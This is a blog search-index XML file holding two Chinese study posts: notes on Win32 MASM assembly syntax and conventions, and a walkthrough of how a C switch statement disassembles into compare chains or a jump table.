<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Windows环境下32位汇编语言程序设计笔记-基础篇]]></title>
      <url>http://akkuman.coding.me/2017/09/14/Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
      <content type="html"><![CDATA[<h2 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个</div><div class="line">option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式</div></pre></td></tr></table></figure>
<a id="more"></a>
<ol>
<li>指定使用的指令集</li>
<li>.model语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.model 内存模式[,语言模式][,其他模式]</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>内存模式</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>内存使用方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>tiny</td>
<td>用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td>
</tr>
<tr>
<td>small</td>
<td>建立代码和数据分别用一个64KB段的.exe文件</td>
</tr>
<tr>
<td>medium</td>
<td>代码段可以有多个64KB段，数据段只有一个64KB段</td>
</tr>
<tr>
<td>compact</td>
<td>代码段只有一个64KB段，数据段可以有多个64KB段</td>
</tr>
<tr>
<td>large</td>
<td>代码段和数据段都可以有多个64KB段</td>
</tr>
<tr>
<td>huge</td>
<td>同large，并且数据段中的一个数组也可以超过64KB</td>
</tr>
<tr>
<td>flat</td>
<td>Win32程序使用的模式，代码和数据使用同一个4GB段</td>
</tr>
</tbody>
</table>
<p><strong><em>对于Win32程序来说，只有一种内存模式，flat模式</em></strong></p>
<h2 id="源程序结构"><a href="#源程序结构" class="headerlink" title="源程序结构"></a>源程序结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall</div><div class="line">option casemap:none</div><div class="line">  &lt;一些include语句&gt;</div><div class="line">.stack [堆栈段的大小] ;常忽略不写</div><div class="line">.data</div><div class="line">  &lt;一些初始化过的变量定义&gt;</div><div class="line">.data?</div><div class="line">  &lt;一些没有初始化过的变量定义&gt;</div><div class="line">.const</div><div class="line">  &lt;一些常量定义&gt;</div><div class="line">.code</div><div class="line">  &lt;代码&gt;</div><div class="line">  &lt;开始标号&gt;</div><div class="line">      &lt;其他语句&gt;</div><div class="line">  end &lt;开始标号&gt;</div></pre></td></tr></table></figure>
<h2 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">local    变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]......</div></pre></td></tr></table></figure>
<p><em>local伪指令必须紧接在子程序的伪指令proc后</em></p>
<p><strong>变量的类型</strong></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>表示方式</th>
<th>缩写</th>
</tr>
</thead>
<tbody>
<tr>
<td>字节</td>
<td>Byte</td>
<td>db</td>
</tr>
<tr>
<td>字</td>
<td>word</td>
<td>dw</td>
</tr>
<tr>
<td>双字(doubleword)</td>
<td>dword</td>
<td>dd</td>
</tr>
<tr>
<td>三字(farword)</td>
<td>fword</td>
<td>df</td>
</tr>
<tr>
<td>四字(quadword)</td>
<td>qword</td>
<td>dq</td>
</tr>
<tr>
<td>十字节BCD码(tenbyte)</td>
<td>tbyte</td>
<td>dt</td>
</tr>
<tr>
<td>有符号字节(signbyte)</td>
<td>sbyte</td>
<td></td>
</tr>
<tr>
<td>有符号字(signword)</td>
<td>sword</td>
<td></td>
</tr>
<tr>
<td>有符号双字(signdword)</td>
<td>sdword</td>
<td></td>
</tr>
<tr>
<td>单精度浮点数</td>
<td>Real4</td>
<td></td>
</tr>
<tr>
<td>双精度浮点数</td>
<td>Real8</td>
<td></td>
</tr>
<tr>
<td>10字节浮点数</td>
<td>Real10</td>
</tr>
</tbody>
</table>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">结构名    struct</div><div class="line"></div><div class="line">字段1     类型    ?</div><div class="line">字段2     类型    ?</div><div class="line">......</div><div class="line"></div><div class="line">结构名    ends</div></pre></td></tr></table></figure>
<p><strong>定义</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;字段1,字段2,...&gt;</div><div class="line">;或者</div><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;&gt;</div></pre></td></tr></table></figure></p>
<p><strong>使用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc</div><div class="line"></div><div class="line">;1</div><div class="line">mov    eax,stWndClass.lpfnWndProc</div><div class="line"></div><div class="line">;2.esi寄存器作指针寻址</div><div class="line">mov    esi,offset stWndClass</div><div class="line">mov    eax,[esi + WNDCLASS.lpfnWndProc]    ;注意这里是WNDCLASS</div><div class="line"></div><div class="line">;3.用assume伪指令把寄存器预先定义为结构指针</div><div class="line">mov    esi,offset stWndClass</div><div class="line">assume esi:ptr WNDCLASS</div><div class="line">mov    eax,[esi].lpfnWndProc</div><div class="line">...</div><div class="line">assume esi:nothing    ;注意：不使用esi做指针的时候需要用这句取消定义</div><div class="line"></div><div class="line">;4.结构的定义可以嵌套</div><div class="line">NEW_WNDCLASS    struct</div><div class="line"></div><div class="line">dwOption        word        ?</div><div class="line">oldWndClass     WNDCLASS    &lt;&gt;</div><div class="line"></div><div class="line">NEW_WNDCLASS    ends</div><div class="line"></div><div class="line">;5.嵌套的引用</div><div class="line">mov    wax,[esi].oldWndClass.lpfnWndProc</div></pre></td></tr></table></figure></p>
<h2 id="以不同的类型访问变量"><a href="#以不同的类型访问变量" class="headerlink" title="以不同的类型访问变量"></a>以不同的类型访问变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;以db定义一个缓冲区</div><div class="line">szBuffer    db    1024 dup (?)</div><div class="line">;mov    ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址</div><div class="line">;类型 ptr 变量名</div><div class="line">mov    ax,word ptr szBuffer</div><div class="line">mov    eax,dword ptr szBuffer</div></pre></td></tr></table></figure>
<h2 id="movzx"><a href="#movzx" class="headerlink" title="movzx"></a>movzx</h2><p>把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    .data</div><div class="line">bTest1    db    12h</div><div class="line">    .code</div><div class="line">movzx    ax,bTest1</div><div class="line">movzx    eax,bTest1</div></pre></td></tr></table></figure></p>
<h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sizeof    变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度</div><div class="line">lengthof  变量名、数据类型或数据结构名 ;取得变量中数据的项数</div></pre></td></tr></table></figure>
<h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov    寄存器,offset 变量名    ;offset是取变量地址的伪操作符</div><div class="line">lea    eax,[ebp-4]            ;运行时按照ebp的值实际计算出地址放到eax中</div><div class="line">;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addr</div><div class="line">addr   局部变量名和全局变量名   ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用</div><div class="line">;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖</div></pre></td></tr></table></figure>
<h2 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]</div><div class="line">        local 局部变量列表</div><div class="line"></div><div class="line">        指令</div><div class="line"></div><div class="line">子程序名 endp</div></pre></td></tr></table></figure>
<h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p><strong>不同语言调用方式的差别</strong><br>|  | C | SysCall | StdCall | BASIC | FORTRAN | PASCAL |<br>| — | — | — | — | — | — | — |<br>| 最先入栈参数 | 右 | 右 | 右 | 左 | 左 | 左 |<br>| 清除堆栈者 | 调用者 | 子程序 | 子程序 | 子程序 | 子程序 | 子程序 |<br>| 允许使用VARARG | 是 | 是 | 是 | 否 | 否 | 否 |</p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjjg3l2dztj209w08f0ur.jpg" alt=""></p>
<h2 id="条件测试语句"><a href="#条件测试语句" class="headerlink" title="条件测试语句"></a>条件测试语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">寄存器或变量    操作符    操作数</div><div class="line">(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...</div><div class="line">;举例，左边表达式，右边是表达式为真的条件</div><div class="line">x==3        ;x等于3</div><div class="line">eax!=3      ;eax不等于3</div><div class="line">(y&gt;=3)&amp;&amp;ebx ;y大于等于3且ebx为非零值</div><div class="line">;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器</div></pre></td></tr></table></figure>
<p>标志位的状态指示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CARRY?        表示Carry位是否置位</div><div class="line">OVERFLOW?     表示Overflow位是否置位</div><div class="line">PARITY?       表示Parity位是否置位</div><div class="line">SIGN?         表示Sign位是否置位</div><div class="line">ZERO?         表示Zero位是否置位</div></pre></td></tr></table></figure></p>
<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.if eax &amp;&amp; (bx &gt;= dWX) || !(dWY != ecx)</div><div class="line">    mov    esi,1</div><div class="line">.elseif edx</div><div class="line">    mov    esi,2</div><div class="line">.elseif esi &amp; 1</div><div class="line">    mov    esi,3</div><div class="line">.elseif ZERO? &amp;&amp; CARRY?</div><div class="line">    mov    esi,4</div><div class="line">.endif</div></pre></td></tr></table></figure>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.while 条件测试表达式</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">.endw</div><div class="line">;或</div><div class="line">.repeat</div><div class="line">    指令</div><div class="line">    [.break [.if 退出条件]]</div><div class="line">    [.continue]</div><div class="line">    .until    条件测试表达式    (或 .untilcxz [条件测试表达式])</div></pre></td></tr></table></figure>
<h2 id="变量和函数的命名"><a href="#变量和函数的命名" class="headerlink" title="变量和函数的命名"></a>变量和函数的命名</h2><h3 id="匈牙利表示法"><a href="#匈牙利表示法" class="headerlink" title="匈牙利表示法"></a>匈牙利表示法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成）</div></pre></td></tr></table></figure>
<p>汇编语言中常用的类型前缀<br>| | |<br>| — | — |<br>| b | 表示byte |<br>| w | 表示word |<br>| dw | 表示dword |<br>| h | 表示句柄 |<br>| lp | 表示指针 |<br>| sz | 表示以0结尾的字符串 |<br>| lpsz | 表示指向0结尾的字符串的指针 |<br>| f | 表示浮点数 |<br>| st | 表示一个数据结构 |</p>
<p>举例<br>| | |<br>| — | — |<br>| hWinMain | 主窗口的句柄 |<br>| dwTimeCount | 时间计数器，以双字定义 |<br>| szWelcome | 欢迎信息字符串，以0结尾 |<br>| lpBuffer | 指向缓存区的指针 |<br>| stWndClass | WNDCLASS结构 |</p>
<p><strong>本书的作者建议</strong></p>
<ul>
<li>全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。</li>
<li>在内部子程序的名称前面加下划线，以便和系统API区别。</li>
</ul>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_Calc    proc    _dwX,_dwY</div><div class="line">         local   @dwResult</div><div class="line"></div><div class="line">         finit</div><div class="line">         fild    _dwX</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;i * i</div><div class="line">         fild    _dwY</div><div class="line">         fld     st(0)</div><div class="line">         fmul                ;j * j</div><div class="line">         fadd                ;i * i + j * j</div><div class="line">         fsqrt               ;sqrt(i * i + j * j)</div><div class="line">         fistp   @dwResult   ;put result</div><div class="line">         mov     eax,@dwResult</div><div class="line">         ret</div><div class="line"></div><div class="line">_calc    endp</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 读书笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 读书笔记 </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[switch反汇编(C语言)]]></title>
      <url>http://akkuman.coding.me/2017/09/07/switch%E5%8F%8D%E6%B1%87%E7%BC%96-C%E8%AF%AD%E8%A8%80.html</url>
      <content type="html"><![CDATA[<p>在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因<br><a id="more"></a></p>
<h2 id="0x01分支结构不超过3个"><a href="#0x01分支结构不超过3个" class="headerlink" title="0x01分支结构不超过3个"></a>0x01分支结构不超过3个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax         //x的值放入[ebp-8]</div><div class="line">00401035   cmp         dword ptr [ebp-8],5</div><div class="line">00401039   je          main+39h (00401049)           //x与5相等就跳转，下面6和7相同</div><div class="line">0040103B   cmp         dword ptr [ebp-8],6</div><div class="line">0040103F   je          main+4Ch (0040105c)</div><div class="line">00401041   cmp         dword ptr [ebp-8],7</div><div class="line">00401045   je          main+5Fh (0040106f)</div><div class="line">00401047   jmp         main+72h (00401082)</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401049   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040104C   push        ecx</div><div class="line">0040104D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401052   call        printf (004010d0)</div><div class="line">00401057   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040105A   jmp         main+83h (00401093)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040105C   mov         edx,dword ptr [ebp-4]</div><div class="line">0040105F   push        edx</div><div class="line">00401060   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401065   call        printf (004010d0)</div><div class="line">0040106A   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040106D   jmp         main+83h (00401093)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040106F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401072   push        eax</div><div class="line">00401073   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401078   call        printf (004010d0)</div><div class="line">0040107D   add         esp,8</div><div class="line">16:           break;</div><div class="line">00401080   jmp         main+83h (00401093)</div><div class="line">17:       default:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401082   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401085   push        ecx</div><div class="line">00401086   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040108B   call        printf (004010d0)</div><div class="line">00401090   add         esp,8</div><div class="line">19:           break;</div><div class="line">20:       &#125;</div></pre></td></tr></table></figure>
<h2 id="0x02分支数超过3且分支存在线性关系"><a href="#0x02分支数超过3且分支存在线性关系" class="headerlink" title="0x02分支数超过3且分支存在线性关系"></a>0x02分支数超过3且分支存在线性关系</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">9</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">0040D778   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040D77F   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D782   mov         dword ptr [ebp-8],eax</div><div class="line">0040D785   mov         ecx,dword ptr [ebp-8]</div><div class="line">0040D788   sub         ecx,5                              //x减去分支中的最小值5，方便构建跳转表</div><div class="line">0040D78B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040D78E   cmp         dword ptr [ebp-8],4                </div><div class="line">0040D792   ja          $L537+13h (0040d7fd)               //x-5&gt;4跳转到default，即x&gt;9跳转</div><div class="line">0040D794   mov         edx,dword ptr [ebp-8]              //edx=x-5</div><div class="line">0040D797   jmp         dword ptr [edx*4+40D81Fh]          //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">0040D79E   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7A1   push        eax</div><div class="line">0040D7A2   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7A7   call        printf (004010d0)</div><div class="line">0040D7AC   add         esp,8</div><div class="line">10:           break;</div><div class="line">0040D7AF   jmp         $L537+24h (0040d80e)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7B1   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7B4   push        ecx</div><div class="line">0040D7B5   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7BA   call        printf (004010d0)</div><div class="line">0040D7BF   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040D7C2   jmp         $L537+24h (0040d80e)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7C4   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D7C7   push        edx</div><div class="line">0040D7C8   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7CD   call        printf (004010d0)</div><div class="line">0040D7D2   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040D7D5   jmp         $L537+24h (0040d80e)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7D7   mov         eax,dword ptr [ebp-4]</div><div class="line">0040D7DA   push        eax</div><div class="line">0040D7DB   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7E0   call        printf (004010d0)</div><div class="line">0040D7E5   add         esp,8</div><div class="line">19:           break;</div><div class="line">0040D7E8   jmp         $L537+24h (0040d80e)</div><div class="line">20:       case 9:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7EA   mov         ecx,dword ptr [ebp-4]</div><div class="line">0040D7ED   push        ecx</div><div class="line">0040D7EE   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D7F3   call        printf (004010d0)</div><div class="line">0040D7F8   add         esp,8</div><div class="line">22:           break;</div><div class="line">0040D7FB   jmp         $L537+24h (0040d80e)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040D7FD   mov         edx,dword ptr [ebp-4]</div><div class="line">0040D800   push        edx</div><div class="line">0040D801   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040D806   call        printf (004010d0)</div><div class="line">0040D80B   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
